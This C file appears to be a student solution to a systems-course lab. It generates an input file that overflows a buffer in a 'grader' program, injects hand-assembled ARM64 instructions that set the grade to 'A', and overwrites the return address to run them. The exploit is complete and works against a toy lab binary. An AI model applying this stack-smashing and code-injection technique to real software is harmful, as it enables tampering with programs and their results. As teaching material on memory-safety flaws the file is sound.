/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Authors: Catherine Yu and Joseph Chen                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* Create a file dataA. Write to dataA the input of grader such
   that the output prints A as the grade. Return 0. */

int main(void)
{
   int i;
   FILE *psFile;
   unsigned long ulData;

   /* Create file dataA */
   psFile = fopen("dataA" , "w");

   /* Write the buffer overflow input to dataA */
   fprintf(psFile, "Joe");
   for(i = 0; i < 5; i++)
      putc('\0', psFile);

   /* mov character A to register and store it into address of grade */
   
   /* mov w0, 0x41 */
   ulData = MiniAssembler_mov(0, 'A');
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* adr x1, address of grade*/
   ulData = MiniAssembler_adr(1, 0x420044, 0x420064);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* strb x0, [x1] */
   ulData = MiniAssembler_strb(0, 1);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* b address of return address in main */
   ulData = MiniAssembler_b(0x400864, 0x42006c);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* add null characters to fill buffer */
   for(i = 0; i < 24; i++)
      putc('\0', psFile);

   /* corrupt return address */
   ulData = 0x420060;
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   fclose(psFile);

   return 0;
}


